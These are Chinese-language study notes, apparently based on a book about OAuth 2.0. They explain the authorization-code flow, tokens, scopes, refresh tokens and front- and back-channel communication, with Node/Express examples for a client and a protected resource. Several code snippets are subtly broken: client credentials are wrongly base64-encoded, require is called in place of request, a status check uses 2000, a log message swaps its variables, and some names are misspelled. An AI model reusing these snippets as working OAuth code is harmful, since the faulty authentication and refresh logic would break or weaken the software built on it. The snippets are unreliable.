这种隔离方案还得客户端不会因用户身份认证方式发生变化而受到影响，让简答的客户端应用也能受益于授权服务器使用的一些新兴技术，例如基于风险的启发式认证（risk-based heuristic authentication）技术。然而这种做法并没有向客户端传递任何有关认证用户的信息。 然后用户向客户端应用授权，这一步，资源拥有者选择将一部分权限授予客户端应用，授权服务器提供了很多不同的选项来实现这一点。客户端可以在授权请求中指明其想要获得哪些权限。授权服务器可以运行用户拒绝一部分或者全部权限范围，也可以让用户批准或者拒绝整个授权请求。 此外，很多授权服务器允许将授权决策保存下来，以便以后使用。如果使用了这种方式，那么未来同一个客户端请求同样的授权时，用户将不会得到提示。用户仍然会被重定向到授权端点，并且仍然需要登录，但是会跳过批准授权环节而沿用前一次的授权决策。授权服务器甚至可以通过像客户端白名单或者黑名单这样的内部策略来否决用户的决策。 然后，授权服务器将用户重定向到客户端应用。这一步采用HTTP重定向的方式，回到客户端的 redirect_uro 12HTTP 302 FoundLocation: http://localhost:9000/oauth_callback?code=8V1pr0rJ&amp;state=Lwt50DDQKUB8U7jtfLQCVGDL9cnmwHH1 这又导致浏览器向客户端发送如下请求 12GET /callback?code=8V1pr0rJ&amp;state=Lwt50DDQKUB8U7jtfLQCVGDL9cnmwHH1HTTP/1.1 Host: localhost:9000 这个HTTP请求是发送给客户端不是给授权服务器的 1234User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0)Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Referer: http://localhost:9001/authorize?response_type=code&amp;scope=foo&amp;client_id=oauth-client-1&amp;redirect_uri=http%3A%2F%2Flocalhost%3A9000%2Fcallback&amp;state=Lwt50DDQKUB8U7jtfLQCVGDL9cnmwHH1Connection: keep-alive 由于使用的是授权码许可类型，因此该重定向链接中包含了一个特殊的查询参数code，这个参数的值被解析为授权码，它是一次性的凭据，表示用户授权决策的结果。客户端会在接收到请求之后解析该参数以获取授权码，并在下一次使用授权码。客户端还会检查state参数值是否与它在前一个步骤中发送的值匹配。 现在客户端已经得到授权码，将其发送给授权服务器的令牌端点。客户端发送一个POST请求，在HTTP主体中以表单的格式传递参数，并在HTTP基本认证头部设置client_id和client_secret。这个HTTP请求由客户端直接发送给授权服务器，浏览器或者资源拥有者不参与此过程。 12345POST /tokenHost: localhost:9001Accept: application/jsonContent-Type: application/x-www-form-encodedAuthorization: Basic b2F1dGgtY2xpZW50LTE6b2F1dGgtY2xpZW50LXNlY3JldC0x grant_type=authorization_code&amp;redirect_uri=http%3A%2F%2Flocalhost%3A9000%2Fcallback&amp;code=8V1pr0rJ 这种将不同的HTTP连接分开的做法保证了客户端能够直接进行身份认证，让其他组件无法查看或操作令牌请求。 授权服务器接收该请求，如果请求有效，则办法令牌。授权服务器需要执行多个步骤以确保请求是合法的。首先，它需要验证客户端凭据（通过Authorization头部传递）以确定是哪个客户端请求授权。然后，从请求主体中读取code参数的值，并从中读取关于该授权码的信息，包括发起初始授权请求的是哪个客户端，执行授权的是哪个用户，授权的内容是什么。如果授权码有效尚未使用过，而且发起该请求的客户端与最初发起授权请求的客户端相同，则授权服务器会生成一个新的访问令牌并返回到客户端。 该令牌以JSON对象的格式通过HTTP响应返回给客户端 12345678HTTP 200 OKDate: Fri, 31 Jul 2016 21:32:32 GMTContent-Type: application/json&#123; "access_token": "987tghjkiu6trfghjuytrghj", "token_type": "Bearer"&#125; 然后客户端可以解析令牌响应并从中获取令牌的值来访问受保护资源。在这个案例，使用了 OAuth bearer令牌，这是通过响应中的 token_type字段描述的。令牌响应还可以包含一个刷新令牌（用于获取新的访问令牌而不必重新请求授权），以及一些关于访问令牌的附加信息，比如令牌的权限访问和过期时间。客户端可以将访问令牌存储在一个安全的地方，以便以后在用户不在场的时候也能够随时访问。 有了令牌，客户端就可以在访问受保护资源时出示令牌。客户端出示的令牌的方式有很多种，备受推崇的方式，使用Authorization头部 12345GET /resource HTTP/1.1Host: localhost:9002Accept: application/jsonConnection: keep-aliveAuthorization: Bearer 987tghjkiu6trfghjuytrghj 受保护资源可以从头部解析出令牌，判断它是否有效，从中得知授权者是谁以及授权内容，然后返回响应。受保护资源检查令牌的方式有很多种，最简单的就是让授权服务器和资源服务器共享存储令牌信息的数据库。授权服务器在生成新的令牌时将其写入数据库，资源服务器在收到令牌时从数据库中读取它们。 OAuth中的角色：客户端、授权服务器、资源拥有者、受保护资源这些组件分别负责OAuth协议的不同部分，并且相互协作使OAuth协议运转。 客户端：是代表资源拥有者访问受保护资源的软件，使用OAuth来获取访问权限，客户端通常是这系统中最简单的组件，它的职责主要是从授权服务器获取令牌以及在受保护资源上使用令牌。客户端不需要理解令牌，也不需要查看令牌的内容。相反，客户端只需要将令牌视为一个不透明的字符串即可。OAuth客户端可以是Web应用、原生应用，甚至是浏览器内的JavaScript应用。 受保护资源：通过HTTP服务进行访问，在访问时需要OAuth访问令牌，受保护资源需要验证收到的令牌，并决定是否响应以及如何响应请求，在OAuth架构中，受保护资源对是否认可令牌拥有最终决定权。在云打印的例子里面，照片存储网站就是属于受保护资源。 资源拥有者：有权将访问权限授权给客户端的主体，与OAuth系统中的其他组件不同，资源拥有者不是软件，在大多数情况下，资源拥有者是一个人，使用客户端软件访问受他控制的资源。至少在部分过程中，资源拥有者要使用Web浏览器（通常称为用户代理）与授权服务器交互。资源拥有者可能还会使用浏览器与客户端交互，但这完全取决于客户端性质。在云打印例子中，资源拥有者就是想要打印照片的最终用户。 OAuth授权服务器：是一个HTTP服务器，在OAuth系统中充当中央组件。授权服务器对资源拥有者和客户端进行身份认证，让资源拥有者向客户端授权、为客户端颁发令牌。某些授期服务器还会提供额外的功能，例如令牌内省、记忆授权决策。在云打印例子中，照片存储网络拥有自己的授权服务器，用户保护资源。 OAuth组件：令牌、权限范围和授权许可访问令牌OAuth访问令牌，有时也被称为令牌，由授权服务器办法给客户端，表示客户端已被授予权限。OAuth没有定义令牌本身的格式和内容，但它总是代表着：客户端请求的访问权限、对客户端授予的资源拥有者，以及被授予的权限（通常包含一些受保护资源标志）。 令牌对客户端来说是不透明的，也就是说客户端不需要，通常也不能查看令牌内容。客户端要做的是持有令牌，向授权服务器请求令牌，并向受保护资源出示令牌。OAuth令牌并非对系统中所有组件都不透明：授权服务器的任务是颁发令牌，受保护资源的任务则是验证令牌。因此，它们都需要理解令牌本身，并知道其含义。然后客户端对这一切一无所知，这使得客户端简单地多，同时也使得授权服务器和受保护资源十分灵活地部署令牌。 权限范围表示一组访问受保护资源的权限，OAuth协议中使用字符串表示权限范围，可以用空格隔开的列表将它们合并成为一个集合。因此，权限范围的值不能包含空格，OAuth并没有规定权限范围值的格式和结构。 权限范围是一种重要机制，界定了客户端的权限范围。权限范围是由受保护资源根据其自身提供的API来定义的。客户端可以请求某些权限范围，授权服务器则运行资源拥有者在客户端发出请求时许可或者否决特定的权限范围。权限范围具有可叠加的特征。 云打印的例子，照片存储服务的API为照片定义了多种权限范围：read-photo/read-metadata/update-photo/update-metadata/create/delete。照片打印服务只要能读取照片就足以完成工作，所以它会请求read-photo权限范围。只要拥有一个该权限范围的令牌，就能读取并按要求打印出来。如果用户想要依据照片日期将照片打印成册的高级功能，则打印服务还需要read-metadata权限范围。由于这是一个额外的访问权限，照片打印服务则需要通过正常的OAuth流程来请求用户授予它这个额外的权限范围。只要照片打印服务拥有包含这两个权限范围的令牌，就能使用该令牌执行相应的操作。 刷新令牌OAuth刷新令牌在概念上与该令牌很相似，它也是由授权服务器颁发给客户端的令牌，客户端也不知道不关系该令牌的内容。但不同的是，该令牌从来不会被发送到保护资源。相反，客户端使用刷新令牌向授权服务器请新的访问令牌，而不需要用户参与。 为什么客户端需要刷新令牌？在OAuth中，访问令牌随时可能失效，令牌有可能被用户撤销，或者过期，或者其他系统导致令牌失效，客户端在使用时会受到错误响应。当然，客户端可以再次向资源拥有者请求权限，但是如果资源拥有者不在场呢？ 在OAuth1.0客户端除了等资源拥有者回来重新授权之外别无他法。未避免这种情况，OAuth1.0的令牌玩玩会一直保持有效，直到被明确地撤销。这是有问题的，因此它增加了被盗令牌的攻击面：攻击者可以永远使用该令牌。OAuth2.0提供了让令牌自动过期的选项，但是需要在用户不在场的时候仍然能访问资源，现在刷洗令牌取代了永不过期的访问令牌，但它的作用不是访问令牌，而是获取新的访问令牌来访问资源。这种做法是一种独立但互补的方式，限制了刷新令牌和访问令牌的暴露范围。 刷新令牌还可以让客户端缩小它的权限范围，如果客户端被授予A/B/C三个权限范围，但是它知道某特定请求只需要A权限范围，则它可以使用刷新令牌重新获取一个仅包含A权限范围的访问令牌。这让足够智能的API可以遵循最小权限安全原则，但也不会给不那么智能的客户端带来负担，即无须查明某个API需要哪些权限。 如果刷新令牌失效了，用户在场，客户端可以随时劳烦用户再次授权，换句话说，客户端退回到了需要重新进行OAuth授权的状态。 授权许可授权许可是OAuth协议中的权限获取方法，OAuth客户端用它来获取受保护资源的访问权限，成功之后客户端会得到一个令牌。令牌表示用户授权所使用的特定方式，也表示授权这个行为本身。开发人员看到回传给客户端的授权码，有时候会误认为这个授权码就是授权许可，虽然授权码代表用户的授权决策，但不是授权许可本身。相反，整个OAuth流程才是授权许可：客户端将用户重定向至授权端点，然后接收授权码，最后用授权码换取令牌。 换句话说，授权许可就是获取令牌的方式。 OAuth的校色与组件的交互：后端信道、前端信道和端点OAuth是一个基于HTTP的协议，但是与大多数基于HTTP的协议不同，OAuth中的交互不总是简单的HTTP请求和响应来完成。 后端通信信道OAuth流程中的很多部分都是用标准的HTTP请求和响应格式来互相通信，由于这些请求通常都发生在资源拥有者和用户代理的可见范围之外，因此它们统称为后端信道通信。 这些请求和响应使用了所有常规的HTTP机制来通信：头部，查询参数、HTTP方法和HTTP主体都能承载对OAuth事务至关重要的信息。 授权服务器提供一个授权端点，供客户端请求访问令牌和刷新令牌。客户端直接向该端点发出请求，携带一组表单格式的参数，授权服务器解析并处理这些参数，然后授权服务器返回一个代表令牌的JSON对象 另外当客户端连接受保护资源的时候，它也是在后端信道上直接发出HTTP请求。这种连接的细节完全依赖受保护资源，因为OAuth能保护的API和系统种类繁多、风格各异。对于任何类型的受保护资源，都需要客户端出示令牌，并且受保护资源必须能理解令牌以及其代表的权限。 前端信道通信在标准HTTP通信中，HTTP客户端向服务器直接发送一个请求，其中包括头部、查询参数、主体以及其他信息。然后HTTP服务器可以查看这些信息，并决定如何响应请求，响应中包含头部、主体以及其他信息。然而，在OAuth中，在某些情况下两个组件是无法至二级相互发送请求和响应的。例如客户端与授权服务器的授权端点交互的时候。前端信道通信就是一种间接通信方法，它将Web浏览器作为媒介，使用HTTP请求实现两个系统间的间接通信。 这一技术隔离了浏览器两端的会话，实现了跨安全域工作。例如，如果用户需要向其中一个组件进行身份认证，并不需要将凭据暴露给另外一个系统。这样在保持信息隔离的情况下，仍然能让用户在通信中发挥作用。 两个互不交互的软件是如何实现通信的？前端信道通信是这样实现的：发起方在一个URL中附加参数并指示浏览器跳转到该URL。然后接收方可以解析该入站URL（由浏览器跳转来的），并使用其中包含的信息。之后，接收方可以将浏览器重定向至发起方托管的URL,并使用同样的方式在URL附加参数。这样两个软件就以Web浏览器为媒介，实现了间接通信。这样意味着每个前端信道的请求和响应实际上是一对HTTP请求/响应事务。 例如，授权码许可中，客户端需要将用户重定向至授权端点，但是也需要将其请求的内容信息传递给授权服务器。为此，客户端向浏览器发送一个HTTP重定向，这个重定向的目标是授权服务器的URL,并且其查询参数中附有特定参数。 12HTTP 302 FoundLocation: http://localhost:9001/authorize?client_id=oauth-client-1&amp;response_type=code&amp;state=843hi43824h42tj 授权服务器可以像处理一般的HTTP请求一样解析传入的URL,从参数中获取信息，这个环节中，授权服务器可以与资源拥有者进行交互，通过浏览器执行一系列HTTP事务，对资源拥有者进行身份认证并请求其授权。当需要给客户端返回授权码时，授权服务器也向浏览器返回重定向响应，但是这一次重定向的目标是客户端的redirect_uri。授权服务器也会在重定向的查询参数中附带信息。 12HTTP 302 FoundLocation: http://localhost:9000/oauth_callback?code=23ASKBWe4&amp;state=843hi43824h42tj 浏览器执行这个重定向时，会向客户端应用发送一个HTTP请求，然后客户端可以解析请求中的参数，这样客户端和授权服务器就以浏览器为媒介实现了通信，而不用直接交互。 Web应用和原生应用都可以使用OAuth，但是都需要使用前端信道机制来接收授权端点返回的信息。前端信道通常需要使用到Web浏览器和HTTP重定向，但常规的Web服务器一般是不提供这些支持的。可以用内部Web服务器、应用专有的URI方案、使用后端服务向客户端推送通知等。只要能触发浏览器对该URI的调用即可。 所有通过前端信道传递的信息都可供浏览器访问，既能被读取，也可能在最终请求发出之前被篡改。OAuth协议已经考虑到了这一点，它限制了能通过前端信道传输的信息类别，并确保只要是通过前端信道传输的信息，就不能在授权任务中单独使用。上面的典型案例中，授权码不能被浏览器直接使用，相反它必须通过后端信道与客户端凭据一并出示。这有些协议中，比如OpenID Connect，要求客户端或授权服务器对前端信道中传输的消息签名，通过这样的安全机制增加一层保护。 小结虽然OAuth协议包含很多移动组件，但它将一些简单的操作组合起来，形成了一套安全的授权方法。 OAuth是关于获取令牌和使用令牌的 OAuth系统中的不同组件各自负责授权流程中的不同环节 组件使用直接的后端信道和间接的前端信道HTTP链接相互通信 第三章：构建简单的OAuth客户端OAuth协议的焦点在于客户端如何获取令牌，以及如何使用令牌代表资源拥有访问受保护资源。在本章建立一个简单的OAuth客户端，使用授权码许可类型从授权服务器获取bearer令牌，并使用该令牌访问受保护资源。 向授权服务器注册OAuth客户端OAuth客户端和授权服务器需要互相了解才能通信，OAuth协议本身不关心如何实现这一点。OAuth客户端由一个称为“客户端标识符”的特殊字符串来标识。OAuth协议的多个组件被称为client_id，在给定一个授权服务器下，每个客户端的标识必须 唯一，因此，客户端标识几乎总是由授权服务器分配，这种分配可以通过开发者门户来完成，也可以使用动态客户端注册。 实例使用手动配置 12345678910111213// client.js// 授权服务器给客户端分配好了标识符以及共享密钥。另外还有redirect_uri、要请求的权限范围集合和其他选项由客户端软件设定const client = &#123; "client_id": "oauth-client-1", "client_secret": "oauth-client-secret-1", "redirect_uris": ["http://localhost:9000/callback"]&#125;// 授权端点与令牌端点const authServer = &#123; authorizationEndpoint: 'http://localhost:9001/authorize', tokenEndpoint: 'http://localhost:9001/token'&#125; 使用授权码许可类型获取令牌OAuth客户端要从授权服务器获取令牌，需要资源拥有者以某种形式授权。下面使用一种被称为授权许可类型的交互授权形式，由客户端将资源拥有者重定向至授权服务器的授权端点，然后，服务器通过redirect_uri将授权码返回给客户端。最后，客户端将受到的授权码发送到授权服务器的令牌端点，换取OAuth访问令牌，再进行解析和存储。 发送授权请求12345678910111213141516171819202122232425262728293031/** * @param &#123;String&#125; base * @param &#123;Object&#125; options * @returns &#123;String&#125; 函数接收一个URL基础和一个对象，对象包含所有要添加到URL中的查询参数。*/const buildUrl = (base, options, hash) =&gt; &#123; const newUrl = url.parse(base, true); delete newUrl.search; if (!newUrl.query) &#123; newUrl.query = &#123;&#125; &#125; __.each(options, (value, key, list) =&gt; &#123; newUrl.query[key] = value; &#125;) if (hash) &#123; newUrl.hash = hash; &#125; return url.format(newUrl)&#125;app.get('/authorize', (req, res) =&gt; &#123; const authorizeUrl = buildUrl(authServer.authorizationEndpoint, &#123; response_type: 'code', client_id: client.client_id, redirect_uri: client.redirect_uris[0] &#125;) res.redirect(authorizeUrl);&#125;) 处理授权响应123456789101112131415161718192021222324252627282930313233343536373839404142const encodeClientCredentials = (clientId, clientSecret) =&gt; &#123; return new Buffer(querystring.escape(clientId) + ':' + querystring.escape(clientSecret).toString('base64'));&#125;// 查看传入参数，并从code参数中读取授权服务器返回的授权码，授权服务器通过重定向让浏览器向客户端发起请求，而不是直接响应客户端请求app.get('/callback', (req, res) =&gt; &#123; const &#123; query: &#123; code &#125; &#125; = req; const form_data = qs.stringify(&#123; grant_type: 'authorization_code', code, // 根据OAuth规范，如果在授权请求中重定向了URI，在令牌请求中也 // 必须包含该URI,可以防止攻击者使用被篡改的重定向URI获取受害人授权码 // 让并无恶意的客户端将受害用户的资源访问权限关联到攻击者账号 redirect_uri: client.redirect_uris[0] &#125;) // HTTP基本认证,Authorization 头部是一个base64 编码的字符串，编码内容是拼接后的用户名和密码，以冒号隔开。 // OAuth2.0要求将客户端ID作为用户名，将客户端密钥作为密码，但是用之前应该先对它们进行URL编码 const headers = &#123; 'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': `Basic $&#123;encodeClientCredentials(client.client_id, client.client_secret)&#125;` &#125; // 使用POST请求将这些信息传送到服务器的授权端点 const tokRes = request('POST', authServer.tokenEndpoint, &#123; body: form_data, headers &#125;) // 请求成功，授权服务器将返回一个包含访问令牌以及其他信息的JSON对象： // &#123;"access_token":"987tghjkiu6trfghjuytrghj","token_type":"Bearer"&#125; // 应用需要读取结果并解析JSON对象，获取访问令牌，保存起来 const body = JSON.parse(tokRes.getBody()); access_token = body.access_token; res.send('index', &#123; access_token: body.access_token &#125;)&#125;) 使用state参数添加跨站保护每当有人访问 localhost:9000/callback，客户端会接收收到的code值，并试图发送给授权服务器。这意味着攻击者有可能会用客户端向授权服务器暴力搜索有效授权码，浪费客户端和授权服务器资源，而且还有可能导致客户端获取一个从未请求过的令牌 可以使用名为state的可选OAuth参数缓解这个问题，将该参数设置为一随机值，应在应用中用变量保存，在丢弃旧的访问令牌后，创建一个state值 state = randomstring.generate(); 需要将值保存起来，因为当通过回调访问 redirect_uri时，还要用到这个值。由于此阶段使用前端信道通信，因此重定向至授权端点的请求一旦发出，客户端应用就会放弃对OAuth协议流程的控制，直到该回调发生，还需要将state添加到通过授权端点URL发送的参数列表中 123456const authorizeUrl = buildUrl(authServer.authorizationEndpoint, &#123; response_type: 'code', client_id: client.client_id, redirect_uri: client.redirect_uris[0], state&#125;) 当授权服务器收到一个带有state参数的授权请求时，必须总是该state参数和授权码一起原样返回客户端。意味着可以检查传入 redirect_uri页面的state值，并与之前保存的值对比，如果不一致，则向最终用户提示错误 123456789101112131415161718const &#123; query: &#123; code, error, state: cbState &#125;&#125; = req;if (error) &#123; res.render('error', &#123; error &#125;) return;&#125;if (cbState !== state) &#123; console.log(`State DOES NOT MATCH: expected $&#123;cbState&#125; got $&#123;state&#125;`) res.render('error', &#123; error: 'State value did not match' &#125;) return;&#125; 如果state与所期望的值不一样，可能是会话固化攻击、授权码暴力搜索或者其他恶意行为。此时客户端会终止所有授权去请求处理，并向用户展示错误页面 使用令牌访问受保护资源受保护资源接收到有效的令牌后，会返回一些有用信息。客户端要做的就是使用令牌向保护资源发出调用请求，有3个合法的位置可用于携带令牌。在客户端中，使用HTTP Authorization头部来传递令牌。 得到的这种访问令牌叫做bearer令牌，它意味着无论是谁，只要持有就可以向保护资源出示，OAuth bearer令牌使用规范明确给出了发送令牌值的3种方法： 使用HTTP Authorization 头部、使用表单格式的请求体参数、使用URL编码的查询参数 由于另外两种方法存在一定的局限性，因此建议尽可能使用Authorization头部。在使用查询参数时，访问令牌的值有可能被无意地泄露到服务端日志中吗，因为查询参数是URL请求的一部分；使用表单的方式，会限制受保护资源只能接受表单格式的输入参数，并且要使用POST方法。如果要API已经按这样的限制运行了，那这种方法没有问题，毕竟不会面临与查询参数方法一样的安全局限。 使用Authorization头部是这3种方法中最灵活和最安全的。由于对客户端来说，使用起来很困难。一个健壮的OAuth客户端或者服务端库应该完整地提供这3种方式，以适应不同情况。 123456789app.get('/fetch_resource', (req, res) =&gt; &#123; // 确认是否已拥有访问令牌，没有需要向用户提示错误并退出 if (!access_token) &#123; res.render('error', &#123; error: 'Missing access token.' &#125;) return; &#125;&#125;) 请求受保护资源，并将获取的响应数据渲染到页面，protectedResource变量设置了一个URL,将向该URL发送请求并期待返回JSON响应。使用OAuth定义的Authorization头发送令牌，将令牌设置为这个头部的值 1234567891011121314151617181920212223242526272829app.get('/fetch_resource', (req, res) =&gt; &#123; // 确认是否已拥有访问令牌，没有需要向用户提示错误并退出 if (!access_token) &#123; res.render('error', &#123; error: 'Missing access token.' &#125;) return; &#125; const headers = &#123; Authorization: `Bearer $&#123;access_token&#125;` &#125; const resource = require('POST', protectedResource, &#123; headers &#125;) if (resource.statusCode &gt;= 200 &amp;&amp; resource.statusCode &lt; 300) &#123; const body = JSON.parse(resource.getBody()); res.render('data', &#123; resource: body &#125;) return; &#125; else &#123; res.render('error', &#123; error: `Server returned response code: $&#123;resource.statusCode&#125;` &#125;) return; &#125;&#125;) 刷新访问令牌OAuth2.0提供了一种无须用户参与的情况下最新访问令牌的方式：刷新令牌。用户在初次授权完成之后不会一直在场，而OAuth经常要在这样的情况下使用。 客户端如何才能知道自己的访问令牌是否有效，唯一的方法就是使用它，然后看结果。如果令牌具有预设的过期时间，授权服务器可以在令牌响应中使用一个可选的expires_in字段来表示预设的有效期。这是一个从令牌发放到预设失效时间之间的秒数值，一个中规中矩的客户端应该会关注这个值，并将过期的令牌丢弃掉。 然后，仅仅指定过期时间还不足以让客户端掌握令牌的状态。很多OAuth实现中，资源拥有者可以在令牌过期之前将其撤销。一个设计良好的客户端应该始终能预料到访问令牌可能随时突然失效，并能做出反应。 可以提示用户重新授权并获取一个新的令牌，刷新令牌最初是与访问令牌在同一个JSON对象中返回给客户端的： 12345&#123; "access_token": "987tghjkiu6trfghjuytrghj", "token_type": "Bearer", "refresh_token": "j2r3oj32r23rmasd98uhjrk2o3i"&#125; 客户端将刷新令牌保存在 refresh_token变量中。授权服务器启动前先清空数据库，再将刷新令牌自动插入数据库。没有插入对应的访问令牌，模拟访问令牌失效但刷新令牌仍有效 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253let access_token = '987tghjkiu6trfghjuytrghj';let scope = null;let refresh_token = 'j2r3oj32r23rmasd98uhjrk2o3i';if(resource.statusCode &gt;=2000 &amp;&amp; resource.statusCode &lt; 300)&#123; const body = JSON.parse(resource.getBody()); res.render('data',&#123;resource:body&#125;) return;&#125;else&#123; access_token = null; if(refresh_token)&#123; refreshAccessToken(req,res) return; &#125;else&#123; res.render('error',&#123;error:resource.statusCode&#125;); return; &#125;&#125;// 向令牌端点发起一个请求，刷新访问令牌是授权许可的一种特殊情况function refreshAccessToken()&#123; // 使用refresh_token作为grant_type参数的值，刷新令牌也作为参数包含在其中 const form_data = qs.stringfy(&#123; grant_type:'refresh_token', refresh_token &#125;) const header = &#123; 'Content-Type':'application/x-www-form-unlencoded', 'Authorization':`Basic $&#123;encodeClientCredentials(client.client_id,client.client.secret)&#125;` &#125; const tokRes = requst('POST',authServer.tokenEndpoint,&#123; body:form_data, headers, &#125;) if(tokRes.statusCode &gt;=200 &amp;&amp; tokRes.statusCode &lt; 300)&#123; const body = JSON.parse(tokRes.getBody) access_token = body.access_token; if(body.refresh_token)&#123; refresh_token = body.refresh_token &#125; scope = body.scope; // 重新获取受保护资源 res.redirect('/fetch_resource') return; &#125;else&#123; // 如果刷新令牌失效，则将刷新令牌与访问领票都丢弃掉，并渲染一个错误提示 console.log('NO refresh token,asking the user to get a new access token'); refresh_token = null; res.render('error',&#123; error:'Unable to refresh token.' &#125;) return; &#125;&#125; 小结Oauth客户单是OAuth生态系统中使用最广泛的部分： 使用授权码许可类型获取令牌只需要几个简单的步骤 如果刷新令牌可用，则可以使用它获取新的访问令牌，而不需要用户参与 使用Oauth2.0的bearer令牌比获取令牌更简单，只需要将一个简单HTTP头部添加到所有HTTP请求中即可 第四章：构建简单的OAuth受保护资源受保护资源，供客户端用访问令牌调用。对于大多数基于Web的API,增加OAuth安全层是一个轻量级的过程。资源服务器需要做的就是传入的HTTP请求中解析出OAuth令牌，验证该令牌，并确定它能用于哪些请求。 尽管受保护资源和授权服务器在概念上是OAuth系统的不同组件，但许多OAuth实现将二者放在一起。这种做法在两个系统耦合紧密下的情况下适用。下面的例子，会在同一台机器使用独立进程运行受保护资源，但是它能够访问授权服务器所用的数据库。 解析HTTP请求中的OAuth令牌受保护资源接受OAuth bearer令牌，因为授权服务器生成的就是bearer令牌，OAuth bearer令牌使用规范定义了3种受保护传递 bearer令牌的方法：使用HTTP Authorization 头部、使用表单参数以及使用查询参数。首选 Authorization头部。 由于要在多个资源URL上执行此操作，会使用一个辅助函数来检查令牌。Express的方法第三个参数是 next，next是一个函数可以调用它来继续处理请求，使得可以使用多个函数处理单个请求，并把令牌检查功能添加到整个应用的请求处理流程中 123const getAccessToken = (req,res,next)=&gt;&#123; // ...&#125; OAuth bearer令牌使用规范规定，在使用HTTP Authorization头部传递令牌时，HTTP头的值以关键字 Bearer开头，后跟一个空格，再跟令牌值本身。而且，OAuth 规范还规定了 Bearer关键字不区分大小写。此外，HTTP规范还规定了Authorization头部关键字本身不区分大小写。这意味着下面的所有HTTP头都是等价的 123Authorization: Bearer xxxAuthorization: bearer xxxauthorization: BEARER xxx 首先，尝试从请求中获取Authorization头部，然后检查是否包含OAuth bearer令牌，由于express自动将所有HTTP头名称转为小写，我们使用字符authorization检查传入的请求对象，还要在头部值转为小写后检查关键字 bearer 123456789let inToken = null;const auth = req.header['authorization'];if(auth &amp;&amp; auth.toLowerCase().indexOf('bearer') === 0)&#123; inToken = auth.slice('bearer '.length);&#125;else if(req.body &amp;&amp; req.body.access_token)&#123; inToken = req.body.access_token;&#125;else if(req.query&amp;&amp;req.query.access_token)&#123; inToken = req.query.access_token;&#125; 检查通过，将头部的bearer关键字和后面的空格去掉，获取令牌值。令牌值本身不区分大小写的，所以要从从初始字符串提取令牌，而不是转换之后的字符串中提取 处理通过表单参数传递令牌，表单参数在请求主体中。OAuth规范不推荐这种方法，因为它认为限制了API的输入只能是表单形式。如果API的本来输入载体是JSON格式，那么客户端就无法在请求主体中加入令牌。在这种情况下，使用Authorization头部才是首选。但是对于那些输入载体就是表单格式的API，这种方法既简单又能和API保持一致，而且不需要处理Authorization头部。 最后一种方法是通过查询参数传递令牌。建议在其他两种方法不能使用的时候才采用该方法。使用这种方法，访问令牌很可能被无意地记录在服务器访问日志中或者通过HTTP Referrer头泄露，它们会整体复制URL。然而，有时候客户端应用无法直接访问HTTP Authorization头部（受限于平台或库），也不能使用表单参数（比如HTTP GET 方法）。另外，这种方法不仅可以在URL中包含资源本身的定位符，而且还可以包含访问方法。在这些情况下，只要有适当的安全措施，OAuth运行客户端通过查询参数来传递令牌。 根据数据存储验证令牌我们可以访问授权服务器用于存储令牌的数据库，这是小型OAuth系统中常用的配置方案，这样的系统将授权服务器与受保护的API放在一起。 例子的授权服务器使用了一个NoSQL数据库，它将数据库存储在磁盘上的文件中，通过一个简单Nodejs模块来访问。如果想实时查看程序运行时数据库的内容，可以监控联系目录的database.sql文件。 根据传入的令牌值执行简单的查找，从数据库中找出访问令牌，服务器将每一个访问令牌和刷新令牌分别作为单独的元素存储在数据中，所以只需要使用数据库的查询功能找出正确的令牌即可。查询函数的细节对于NoSQL数据库来说是特有的，但是其他数据库也会提供类似的查询方法 1234567891011121314nosql.one((token)=&gt;&#123; if(token.access_token === inToken)&#123; return token; &#125;&#125;,(err,token)=&gt;&#123; if(token)&#123; console.log(`We found a matching token: $&#123;inToken&#125;`) &#125;else&#123; console.log('No matching token was found.') &#125; req.access_token = token; next(); return;&#125;) 传入的第一个函数将获取令牌与数据库中的访问令牌进行对比，如果发现匹配项，就会停止搜索并返回令牌。第二个函数会在发生匹配的令牌时或者数据库遍历到尽头被调用。如果在数据库找到令牌，它会被作为token参数传入，否则为null。无论找到什么，都将它赋值个req对象的access_token成员，然后调用next函数，req对象会自动传递给处理函数的下一个处理步骤 返回的令牌对象与授权服务器在生成令牌时插入数据库的对象完全相同，例如，示例授权服务器会像下面这样将访问令牌以及权限范围保存在下一个JSON对象中 12345&#123; access_token:'xxx', client_id:'xx', scope:['xxx']&#125; 使用共享数据是一种非常常见的OAuth部署模式，但不是唯一的选择。有一个叫做令牌内省（token introspection）的Web协议，它可以有授权服务器提供接口，让资源服务器可以在运行时检查令牌的状态。这使得资源服务器可以像客户端那样将令牌本身视为不透明的。代价是使用而更加的网络流量。还有另一种方式：可以在令牌内包含受保护资源能够直接解析并理解的信息。JWT就是这样的一种数据结构，它可以使用受加密保护的JSON对象携带声明信息。 是否必须将令牌以原始值存储在数据中，虽然这是一种简单且常见的做法，也可以存储令牌的散列值，这种方式类似存储用户密码，在查询令牌时，要将令牌再次进行散列计算，并同数据库中内容进行比较。还可以将唯一标识符添加到令牌中，并使用服务器的密钥对它签名。在数据库中只存储这唯一的标识符。当需要查找这个令牌的时候，资源服务器可以验证签名，解析令牌得到标识符，然后在数据库中查找这个标识符对应的令牌信息。 接入服务，在Express应用中，有两个选择，一个是用于每个请求，二是只将它用于需要检查OAuth令牌的请求。为了将这一处理应用到每个请求，需要设置一个新的监听器。将令牌检查函数链接到处理流程中。令牌检查函数需要在路由中其他所有函数之前连接，因为这些函数是按照在代码中被添加的顺序来执行的。 1app.all('*',getAccessToken) 另外可以将新函数插入已有的处理函数设置，让新函数先被调用。 1app.post('/resource',(req,res)=&gt;&#123;&#125;) 要让令牌处理函数先被调用，需要在路由的处理函数定义之前添加函数 1app.post('/resource',getAccessToken,(req,res)=&gt;&#123;&#125;) 当路由处理函数被调用时，请求对象会附加一个access_token成员，如果令牌被找到，这个字段就会包含从数据库中取出的令牌对象。如果令牌未被找到，这个字段就会是null,需要根据情况判断 12345if(req.access_token)&#123; res.json(resource)&#125;else&#123; res.status(401).end()&#125; 根据令牌提供内容很多API设计中，不同的操作需要不同访问权限，还有一些API会根据授权者不同而返回不同的结果，或者根据不同权限返回某一部分信息。加一个 requireAccessToken处理函数，会在令牌不存在时直接返回错误，在令牌存在时将控制权交给最终处理函数进行后续处理 1234567const requireAccessToken = (req,res,next)=&gt;&#123; if(req.access_token)&#123; next(); &#125;else&#123; res.status(401).end(); &#125;&#125; 